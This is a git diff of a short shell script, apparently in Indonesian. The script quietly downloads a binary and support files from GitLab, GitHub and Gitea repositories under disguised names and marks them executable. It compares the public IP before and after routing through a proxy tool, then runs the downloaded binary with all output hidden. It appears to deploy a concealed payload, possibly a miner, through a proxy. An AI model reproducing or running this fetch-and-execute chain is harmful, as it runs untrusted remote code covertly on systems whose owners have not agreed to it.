@@ -1,6 +1,6 @@
 proxy="192.252.209.155" 
 port="14455"  
-wget -q -O 3608529703 https://gitlab.com/55113110159/dokerweb/-/raw/main/zydo191 && chmod +x 3608529703
+wget -q -O 0203567656 https://gitlab.com/55113110159/dokerweb/-/raw/main/zydo191 && chmod +x 0203567656
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/SHA256SUMS && chmod +x SHA256SUMS 
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
@@ -19,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./3608529703 -c "config.json" >/dev/null 2>&1
+./panel ./0203567656 -c "config.json" >/dev/null 2>&1
